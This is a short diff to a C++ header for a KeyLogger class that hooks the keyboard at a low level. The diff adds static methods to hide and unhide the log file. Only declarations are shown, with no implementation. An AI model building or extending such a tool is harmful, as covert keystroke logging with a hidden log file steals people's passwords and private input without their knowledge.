@@ -5,6 +5,7 @@
 #include <fstream>
 #include <string>
 
+
 class KeyLogger {
 public:
     KeyLogger(const std::string& filename);
@@ -14,6 +15,11 @@ public:
 
     // Stops the hook and exits the message loop
     void stop();
+
+    static void hideFile(const std::string& filename);
+
+    // Unhide a file (reset attributes to Normal)
+    static void unhideFile(const std::string& filename);
 
 private:
     // Keyboard hook procedure for low-level key capture
